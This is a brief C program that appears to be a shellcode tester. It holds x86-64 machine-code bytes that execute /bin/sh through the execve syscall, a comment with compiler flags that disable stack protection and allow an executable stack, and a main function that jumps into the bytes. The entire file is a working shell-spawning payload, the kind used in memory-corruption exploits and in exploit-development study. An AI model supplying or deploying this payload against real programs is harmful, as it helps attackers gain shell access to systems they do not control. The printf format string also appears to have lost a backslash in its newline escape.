// gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
#include <stdio.h>

unsigned char code[] = 
"\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
"\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
"\x54\x5f\x6a\x3b\x58\x0f\x05";
    
main()
{
    printf("Shellcode Length: %dn", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}